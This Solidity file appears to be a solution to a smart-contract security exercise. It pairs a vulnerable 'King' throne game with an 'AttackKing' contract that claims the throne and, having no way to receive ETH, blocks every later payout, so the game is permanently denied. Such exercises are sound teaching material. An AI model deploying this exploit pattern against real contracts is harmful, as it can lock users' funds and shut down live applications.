// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract AttackKing {
    King king;

    function attack(address payable _king) public payable returns (bool) {
        king = King(_king);
        require(msg.value >= king.prize(), "Send more ETH to claim the throne");

        (bool sent, ) = _king.call{value: msg.value}("");
        return sent;
    }
}
